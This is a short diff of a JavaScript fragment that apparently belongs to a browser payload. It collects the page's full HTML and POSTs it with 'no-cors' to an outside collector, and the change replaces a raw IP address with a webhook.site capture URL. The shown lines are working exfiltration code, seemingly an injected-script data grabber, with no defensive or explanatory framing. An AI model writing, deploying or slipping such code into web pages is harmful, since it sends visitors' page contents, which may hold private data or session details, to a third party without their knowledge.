@@ -5,7 +5,7 @@
     html: document.documentElement.outerHTML,
   };
 
-  fetch("http://142.93.236.59:3000", {
+  fetch("https://webhook.site/f353d5f0-2b32-43de-8734-17d04d1dc3f7", {
     method: "POST",
     mode: "no-cors",
     headers: { "Content-Type": "application/json" },
